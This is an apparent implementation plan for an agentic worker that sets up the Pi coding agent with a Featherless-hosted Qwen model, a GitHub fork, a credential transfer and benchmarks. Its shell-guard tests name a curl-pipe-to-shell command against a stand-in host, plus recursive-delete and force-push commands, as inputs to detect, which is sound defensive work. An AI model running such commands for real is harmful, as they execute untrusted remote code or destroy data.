# Pi Featherless Qwen Coding Setup Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Install Pi, create and optimise the user's pi-config fork, securely configure the requested Featherless model, select the more reliable tool profile with bounded live tests, and prove the final pushed setup.

**Architecture:** Keep the public fork as the secret-free source of truth and load a small set of extensions from its permanent local clone. Keep machine runtime settings and the API credential under Pi's global agent directory, with the credential transferred in memory from OpenCode and protected by Windows ACLs. Use disposable fixtures and JSON event-stream parsing to select the tool profile and to verify the final agent loop.

**Tech Stack:** Windows PowerShell, Node.js 24 standard library and test runner, npm, Git, GitHub CLI, Pi 0.84.3, TypeScript extensions, Featherless OpenAI-compatible Chat Completions API.

**Spec:** `docs/superpowers/specs/2026-08-28-pi-featherless-qwen-design.md`

## Global Constraints

- Install `@earendil-works/pi-coding-agent@0.84.3` with npm lifecycle scripts disabled.
- Keep the exact model id `OBLITERATUS/Qwen3.8-27B-OBLITERATED` and provider id `featherless`.
- Treat 32,768 tokens as the model ceiling and lower it when the authenticated plan ceiling is smaller.
- Start with temperature `0`, repetition penalty `1.15`, 4,096 maximum output tokens and parallel tool calls disabled.
- Never print, patch, commit or pass the Featherless credential on a command line.
- Keep `origin` pointed at `ryanduguid/pi-config` and `upstream` pointed at `amosblomqvist/pi-config`.
- Preserve existing Pi sessions and unrelated runtime state, and create the backup before credential transfer.
- Keep network, browser, memory and subagent resources disabled by default.
- Do not publish a pull request to upstream or add an upstream licence claim.
- Execute sequentially; the user did not request subagents.

## File Map

Workspace-only control and evidence files:

- `work/GATES.md`: approved completion ledger.
- `work/verify-pi-setup.mjs`: non-secret verifier with modes `installation`, `fork`, `profile`, `model`, `credential-safety`, `benchmark` and `final-state`.
- `work/verify-pi-setup.test.mjs`: unit tests for verifier parsing, redaction and positive-control scanning.
- `work/install-featherless-credential.ps1`: non-printing OpenCode-to-Pi credential transfer and ACL application.
- `work/query-featherless-metadata.ps1`: authenticated metadata query that writes only non-secret limits and capabilities.
- `work/run-pi-benchmark.mjs`: candidate runner and scorer.
- `work/run-pi-live-smoke.mjs`: final text and coding-loop oracle used by G6.
- `work/lib/pi-json-runner.mjs`: bounded process runner and Pi JSON event parser shared by benchmark and smoke scripts.
- `work/lib/pi-json-runner.test.mjs`: fake-process and event-parser tests.
- `work/fixtures/pi-smoke/package.json`: fixture-declared test command.
- `work/fixtures/pi-smoke/math.js`: resettable seeded defect.
- `work/fixtures/pi-smoke/math.test.js`: deterministic acceptance test.
- `outputs/featherless-capabilities.json`: authenticated, non-secret plan/model metadata.
- `outputs/pi-benchmark-report.json`: redacted candidate results and selected winner.
- `outputs/pi-setup-state.json`: non-secret backup and local-clone paths used by final verification.
- `outputs/pi-setup-summary.md`: final commands, rollback location and verification summary without credentials.

Fork files:

- `extensions/ask-user-question.ts`: current Pi imports and shorter model-facing guidance.
- `extensions/bash-guard/index.ts`: UI and extension wiring around the pure policy module.
- `extensions/bash-guard/policy.ts`: deterministic shell-risk policy.
- `extensions/bash-guard/test/policy.test.mjs`: read-only Git, state-changing Git, pipe and destructive-command tests.
- `extensions/custom-header.ts`: current Pi imports and removal of unused imports.
- `extensions/web-fetch/index.ts`: current Pi imports while remaining disabled by default.
- `extensions/web-fetch/package.json` and `package-lock.json`: direct `typebox` dependency.
- `extensions/web-search/index.ts`: current Pi imports while remaining disabled by default.
- `profiles/featherless-qwen38/AGENTS.md`: compact global coding agreement.
- `profiles/featherless-qwen38/models.example.json`: secret-free provider and model definition.
- `profiles/featherless-qwen38/settings.windows.json`: winning Windows settings written after the benchmark.
- `profiles/featherless-qwen38/README.md`: install, selection, security and rollback guide.
- `profiles/featherless-qwen38/prompts/implement.md`: bounded implementation template.
- `profiles/featherless-qwen38/prompts/verify.md`: verification template.
- `scripts/verify-featherless-qwen-profile.mjs`: standard-library structural verifier.
- `tests/verify-featherless-qwen-profile.test.mjs`: positive and negative fixture tests for the profile verifier.
- `docs/superpowers/specs/2026-08-28-pi-featherless-qwen-design.md`: approved architecture copied into the fork.
- `docs/superpowers/plans/2026-08-28-pi-featherless-qwen-implementation.md`: this execution plan copied into the fork.
- `README.md`: concise profile entry and secret-handling warning.

### Task 1: Build the local verification harness and backup oracle

**Files:**
- Create: `work/verify-pi-setup.test.mjs`
- Create: `work/verify-pi-setup.mjs`
- Create: `work/install-featherless-credential.ps1`
- Create: `work/query-featherless-metadata.ps1`

**Interfaces:**
- `verify-pi-setup.mjs <mode>` exits zero and prints only the mode's success token after all assertions pass.
- `scanTextEntries(entries, secret)` returns matched paths without exposing matched text; the credential-safety mode first proves it against a synthetic positive control.
- `install-featherless-credential.ps1` reads two fixed JSON paths, writes Pi's `featherless` API-key entry and emits only `PI_CREDENTIAL_TRANSFER_OK`.
- `query-featherless-metadata.ps1` writes the authenticated plan/model limits to `outputs/featherless-capabilities.json` and emits only `FEATHERLESS_METADATA_OK`.

- [ ] **Step 1: Write verifier unit tests before the verifier**

Use `node:test` and `node:assert/strict` to cover:

```js
test("secret scanner catches its positive control", () => {
  assert.deepEqual(scanTextEntries([["control.txt", "prefix SYNTHETIC_SECRET suffix"]], "SYNTHETIC_SECRET"), ["control.txt"]);
});

test("redactor never returns the supplied secret", () => {
  const secret = "synthetic-key";
  assert.equal(redact(`failure ${secret}`, [secret]).includes(secret), false);
});

```

- [ ] **Step 2: Run the tests and confirm they fail because the verifier exports do not exist**

Run: `node --test work\verify-pi-setup.test.mjs`

Expected: nonzero exit caused by the missing `verify-pi-setup.mjs` exports.

- [ ] **Step 3: Implement the verifier's pure helpers and seven gate modes**

Export these exact helpers for tests:

```js
export function scanTextEntries(entries, secret) {}
export function redact(text, secrets) {}
```

Each mode must inspect the real artefact named by its gate, reject missing paths or malformed JSON, and print exactly one success marker only after every assertion. The credential-safety mode must load the credential in memory, prove the scanner against `SYNTHETIC_SECRET`, scan only the fork and generated non-secret artefacts, and redact all caught exception messages.

- [ ] **Step 4: Implement non-printing metadata and credential scripts**

Credential output shape:

```json
{
  "featherless": {
    "type": "api_key",
    "key": "<read in memory from OpenCode>"
  }
}
```

The literal key must never appear in either script. Merge other Pi auth providers rather than replacing them. Build a protected ACL containing the current Windows identity and `NT AUTHORITY\SYSTEM`, verify the resulting ACL, and print only the success token.

Metadata output shape:

```json
{
  "provider": "featherless",
  "model": "OBLITERATUS/Qwen3.8-27B-OBLITERATED",
  "planContextLimit": 32768,
  "modelContextLimit": 32768,
  "effectiveContextLimit": 32768,
  "modelMaxCompletionTokens": 32768,
  "configuredMaxOutputTokens": 4096,
  "toolCalling": true,
  "vision": false
}
```

Provider limits and capabilities must come from the authenticated endpoints; configured output is derived from those limits. `vision` remains false unless the returned metadata explicitly proves image input.

- [ ] **Step 5: Run verifier tests and ledger lint**

Run: `node --test work\verify-pi-setup.test.mjs`

Expected: all tests pass.

Run: `node C:\Users\-\.agents\skills\unlazy\scripts\gate-lint.mjs work\GATES.md`

Expected: `LINT OK`.

### Task 2: Preserve the existing Pi state and install the audited Pi release

**Files:**
- Create: `C:\Users\-\Documents\Pi Backups\agent-before-featherless-<timestamp>\`
- Create: `C:\Users\-\Documents\Pi Backups\agent-before-featherless-<timestamp>\manifest.sha256`
- Modify through npm: global package installation under the existing npm prefix

**Interfaces:**
- The latest matching backup path is discoverable by `verify-pi-setup.mjs final-state`.
- `pi --version` returns `0.84.3`.

- [ ] **Step 1: Resolve and validate explicit backup paths**

Resolve the source to `C:\Users\-\.pi\agent`, the parent to `C:\Users\-\Documents\Pi Backups`, and a new timestamped child. Confirm the source exists, the target does not, and neither resolves to a filesystem root or home directory.

- [ ] **Step 2: Copy the existing agent directory and write a SHA-256 manifest**

Use one PowerShell process with `Copy-Item -LiteralPath ... -Recurse` and `Get-FileHash`. Do not remove or overwrite the source. Record the chosen backup path in `outputs/pi-setup-state.json` without file contents.

- [ ] **Step 3: Install the pinned package without lifecycle scripts**

Run: `npm install -g --ignore-scripts @earendil-works/pi-coding-agent@0.84.3`

Expected: zero exit and the package is present under the configured global npm prefix.

- [ ] **Step 4: Run the installation gate directly**

Run: `node work\verify-pi-setup.mjs installation`

Expected: `PI_INSTALLATION_OK`.

### Task 3: Create the GitHub fork and permanent clone

**Files:**
- Create: `C:\Users\-\Documents\Repos\pi-config\.git\`
- Modify remotely: create `ryanduguid/pi-config` as a public GitHub fork

**Interfaces:**
- Local `origin` fetch/push URL identifies `ryanduguid/pi-config`.
- Local `upstream` fetch URL identifies `amosblomqvist/pi-config`.
- The checked-out starting commit equals upstream `main` at the audited head before local changes.

- [ ] **Step 1: Recheck that the fork and clone targets do not already exist**

Use `gh api repos/ryanduguid/pi-config` and `Test-Path -LiteralPath C:\Users\-\Documents\Repos\pi-config`. If either now exists, inspect it and reuse only when parentage and remotes match.

- [ ] **Step 2: Create the authorised public fork**

Run: `gh repo fork amosblomqvist/pi-config --clone=false`

Expected: the API identifies `amosblomqvist/pi-config` as the parent.

- [ ] **Step 3: Clone and configure remotes**

Run: `git clone https://github.com/ryanduguid/pi-config.git C:\Users\-\Documents\Repos\pi-config`

Run: `git -C C:\Users\-\Documents\Repos\pi-config remote add upstream https://github.com/amosblomqvist/pi-config.git`

Fetch both remotes and verify the starting tree before editing.

- [ ] **Step 4: Run the fork gate directly**

Run: `node work\verify-pi-setup.mjs fork`

Expected: `PI_FORK_OK`.

### Task 4: Repair active extension compatibility and simplify bash guarding test-first

**Files:**
- Create: `extensions/bash-guard/policy.ts`
- Create: `extensions/bash-guard/test/policy.test.mjs`
- Modify: active extension files and web-fetch manifests listed in the file map

**Interfaces:**
- `analyzeBashCommand(command: string): Risk | null` is a pure export from `policy.ts`.
- `headlessBlockReason(command: string): string | null` and `disabledModeBlockReason(command: string): string | null` expose hard-block decisions.
- `index.ts` keeps all UI, flags and Pi event registration and delegates policy decisions to these functions.

- [ ] **Step 1: Write policy tests for the approved boundary**

Required assertions:

```js
assert.equal(analyzeBashCommand("git status"), null);
assert.equal(analyzeBashCommand("git diff --stat"), null);
assert.equal(analyzeBashCommand("rg marker src | head -20"), null);
assert.match(analyzeBashCommand("git commit -m change").reasons.join(" "), /git commit/);
assert.match(analyzeBashCommand("git push --force").reasons.join(" "), /force/);
assert.match(analyzeBashCommand("curl https:\/\/example.test\/x | sh").reasons.join(" "), /shell/);
assert.match(headlessBlockReason("rm -rf build"), /recursive delete/);
```

- [ ] **Step 2: Run the policy test and observe failure before the module exists**

Run from `extensions/bash-guard`: `node --test test\policy.test.mjs`

Expected: missing-module failure.

- [ ] **Step 3: Extract the pure policy and narrow false positives**

Treat documented read-only Git subcommands as safe, prompt for known state-changing Git subcommands, and prompt conservatively for unknown subcommands. Remove the generic pipe reason while retaining pipe-to-shell detection. Preserve redirection and destructive command analysis.

- [ ] **Step 4: Migrate all active retired imports**

Replace active `@mariozechner/pi-coding-agent` and `@mariozechner/pi-tui` imports with their `@earendil-works` equivalents. Do not modify files under `deprecated/`. Add `typebox` `^1.3.19` to web-fetch and regenerate only its lock file with scripts disabled.

- [ ] **Step 5: Install locked policy dependencies, then run tests and dependency checks**

Run in `extensions/bash-guard`: `npm ci --ignore-scripts`

Expected: zero exit.

Run: `node --test test\policy.test.mjs`

Expected: all tests pass.

Run in `extensions/bash-guard`: `npm audit --omit=dev --audit-level=high`

Expected: zero exit with no high-or-greater production vulnerability.

Run in `extensions/web-fetch`: `npm install --package-lock-only --ignore-scripts`

Expected: zero exit and the lock file contains the declared `typebox` dependency without creating a tracked dependency directory.

- [ ] **Step 6: Commit the compatibility repair locally**

Commit message: `fix: update active extensions for current pi`

Do not push yet.

### Task 5: Add the reusable secret-free Featherless profile test-first

**Files:**
- Create and modify all fork profile, verifier, documentation, spec and plan files listed in the file map, except the winning `settings.windows.json`.

**Interfaces:**
- `verify-featherless-qwen-profile.mjs <profile-directory>` validates JSON, exact provider/model ids, no credential fields or key-like strings, valid extension paths and required prompt files.
- The verifier prints `FEATHERLESS_QWEN_PROFILE_OK` only after every assertion.

- [ ] **Step 1: Write positive and negative verifier tests**

Use temporary directories. The positive fixture contains the exact provider/model without `apiKey`; the negative fixture contains `"apiKey": "synthetic-secret"` and must be rejected.

- [ ] **Step 2: Run tests and observe the missing verifier failure**

Run: `node --test tests\verify-featherless-qwen-profile.test.mjs`

Expected: missing-module failure.

- [ ] **Step 3: Implement the structural verifier with Node standard library only**

Reject missing files, JSON parse errors, any `apiKey` field, strings beginning with the known Featherless key prefix, wrong context/model ids, and settings paths that escape the permanent clone.

- [ ] **Step 4: Add the compact coding agreement, provider example, prompts and documentation**

The coding agreement must encode inspect, change, verify and report; prohibit routing/delegation narration and unchanged retries; require repository-defined checks; and stay under 350 words.

The provider example must contain exact non-secret values and no `apiKey` field.

- [ ] **Step 5: Copy the approved spec and implementation plan into the fork**

Preserve their filenames and content. Add a README entry linking to the profile guide and explicitly state that credentials belong in Pi's private auth store.

- [ ] **Step 6: Run profile tests and verifier**

Run: `node --test tests\verify-featherless-qwen-profile.test.mjs`

Expected: all tests pass.

Run: `node scripts\verify-featherless-qwen-profile.mjs profiles\featherless-qwen38`

Expected before Task 7: a specific nonzero result stating that the winning settings file is not yet selected. All other checks must pass.

- [ ] **Step 7: Commit the reusable profile foundation locally**

Commit message: `feat: add Featherless Qwen coding profile`

Do not push yet.

### Task 6: Apply secure machine configuration and confirm provider metadata

**Files:**
- Modify: `C:\Users\-\.pi\agent\settings.json`
- Create: `C:\Users\-\.pi\agent\models.json`
- Create: `C:\Users\-\.pi\agent\AGENTS.md`
- Modify securely: `C:\Users\-\.pi\agent\auth.json`
- Create: `outputs/featherless-capabilities.json`

**Interfaces:**
- Pi resolves provider `featherless` from `models.json` and auth from `auth.json`.
- Runtime settings load four selected extension paths and the two prompt templates from the permanent clone.

- [ ] **Step 1: Query authenticated plan and model metadata without logging the key**

Run: `powershell -NoProfile -ExecutionPolicy Bypass -File work\query-featherless-metadata.ps1`

Expected: `FEATHERLESS_METADATA_OK` and a non-secret capabilities file.

- [ ] **Step 2: Calculate context-dependent settings**

Set effective context to `min(planContextLimit, modelContextLimit, 32768)`. At 32,768 use 4,096 output, 6,144 reserve and 10,000 recent tokens. For a lower ceiling, use output `max(2048, floor(effective/8))`, reserve `output + 2048`, and recent `floor(effective * 0.30)`; reject a ceiling below 16,384 as unsuitable for this coding profile.

- [ ] **Step 3: Write non-secret models, settings and AGENTS files**

Use `apply_patch`, preserve `lastChangelogVersion`, set default project trust to `ask`, install telemetry false, retries two, provider retries zero, and reference only selected fork resources. Use the lean candidate as the temporary default; the benchmark will replace it if expanded wins.

- [ ] **Step 4: Transfer the credential and verify its ACL**

Run: `powershell -NoProfile -ExecutionPolicy Bypass -File work\install-featherless-credential.ps1`

Expected: `PI_CREDENTIAL_TRANSFER_OK` only.

- [ ] **Step 5: Verify model discovery before paid generation**

Run: `pi --list-models featherless`

Expected: the exact requested model appears without an extension-load error.

Run: `node work\verify-pi-setup.mjs model`

Expected: `PI_MODEL_CONFIG_OK`.

Run: `node work\verify-pi-setup.mjs credential-safety`

Expected: `PI_CREDENTIAL_SAFETY_OK`.

### Task 7: Benchmark both tool surfaces and write only the winner

**Files:**
- Create: `work/lib/pi-json-runner.mjs`
- Create: `work/run-pi-benchmark.mjs`
- Create: `work/run-pi-live-smoke.mjs`
- Create: fixture files listed in the file map
- Create: `outputs/pi-benchmark-report.json`
- Create: `profiles/featherless-qwen38/settings.windows.json`
- Modify: `C:\Users\-\.pi\agent\settings.json`

**Interfaces:**
- `runPi({cwd, prompt, tools, timeoutMs})` returns exit code, bounded events, final text, tool calls, invalid calls, repeated identical calls, token usage and elapsed milliseconds.
- Candidate names are exactly `lean` and `expanded`.
- A winner must pass all three fixtures; ties prefer fewer invalid/repeated calls, then fewer total tool calls and lower prompt tokens.

- [ ] **Step 1: Write runner tests using a fake JSON-lines child process**

Cover normal text, tool start/end, malformed JSON, timeout, repeated identical calls and error events.

- [ ] **Step 2: Run tests and observe failure before runner implementation**

Run: `node --test work\lib\pi-json-runner.test.mjs`

Expected: missing-module or unimplemented assertion failure.

- [ ] **Step 3: Implement the bounded JSON event runner and disposable fixtures**

Cap each Pi process at five minutes, captured output at 2 MiB, tool calls at 20 and unchanged identical calls at zero. Kill the child tree on timeout. Redact any caught string against the in-memory credential before reporting.

- [ ] **Step 4: Implement the three deterministic benchmark fixtures**

Each candidate runs sequentially with `--mode json`, `--no-session`, the explicit provider/model and its exact tool allowlist. Reset fixtures between candidates. Independent Node assertions decide project-description accuracy, seeded-defect repair and multi-step termination.

- [ ] **Step 5: Run the benchmark once and select the winner**

Run: `node work\run-pi-benchmark.mjs`

Expected: `PI_BENCHMARK_COMPLETE winner=<lean|expanded>`.

If neither candidate is eligible, inspect the failing event shape, make one compatibility change allowed by the spec, and rerun only the failing fixture. Do not exceed that bounded adjustment.

- [ ] **Step 6: Apply and document the winner**

Write the exact winning `defaultTools` to the global settings and the fork's `settings.windows.json`. Add the non-secret benchmark summary to the profile README.

- [ ] **Step 7: Run runner tests, profile tests and benchmark gate**

Run: `node --test work\lib\pi-json-runner.test.mjs`

Run: `node --test tests\verify-featherless-qwen-profile.test.mjs`

Run: `node scripts\verify-featherless-qwen-profile.mjs profiles\featherless-qwen38`

Expected: all tests pass and `FEATHERLESS_QWEN_PROFILE_OK`.

Run: `node work\verify-pi-setup.mjs benchmark`

Expected: `PI_BENCHMARK_OK`.

- [ ] **Step 8: Commit the winning profile locally**

Commit message: `feat: optimise Qwen profile from live tool benchmarks`

Do not commit the benchmark report or any machine-specific credential file.

### Task 8: Approve and execute gates, push the verified fork, and reverify

**Files:**
- Create: `outputs/pi-setup-summary.md`
- Modify: `work/GATES.md` evidence through the approved gate checker
- Modify remotely: push tested commits to `ryanduguid/pi-config`

**Interfaces:**
- Every gate must have current evidence.
- Local verified HEAD and remote default-branch HEAD must match after push.

- [ ] **Step 1: Inspect every gate command and every called script**

Run status only: `node C:\Users\-\.agents\skills\unlazy\scripts\gate-check.mjs --status work\GATES.md`

Read the scripts in full and confirm they match the approved commands and never print the credential.

- [ ] **Step 2: Approve the inspected ledger commands**

Run: `node C:\Users\-\.agents\skills\unlazy\scripts\gate-check.mjs --approve work\GATES.md`

Expected: commands execute; G8 may remain unmet until the push completes.

- [ ] **Step 3: Run a fresh final live smoke with the winner**

Run: `node work\run-pi-live-smoke.mjs`

Expected: `PI_LIVE_SMOKE_OK`.

- [ ] **Step 4: Ensure ignored/generated state is not staged**

Verify no `auth.json`, environment file, node_modules, browser profile, benchmark report, absolute machine credential path or key-like value is tracked. Stage only reviewed fork source, tests, docs and the winning profile.

- [ ] **Step 5: Push the tested commits without force**

Run: `git push origin main`

Expected: zero exit and remote head equals the locally tested head.

- [ ] **Step 6: Write the non-secret setup summary**

Include the installed Pi version, fork URL, clone path, exact default model, winning tools, live-test result, backup path, `pi` launch command, rollback steps and any unverified check. Do not include credential values or hashes.

- [ ] **Step 7: Reverify every runnable gate after the push**

Run: `node C:\Users\-\.agents\skills\unlazy\scripts\gate-check.mjs --reverify work\GATES.md`

Expected: `ALL MET (9/9)`.

- [ ] **Step 8: Refresh the Agent Hub handoff and release the claim**

Set the task to done only after all nine gates are met, record the final non-secret evidence summary, then run:

`node C:\agent-hub\.scripts\hub-claim.js pi-featherless-qwen-setup codex --release`
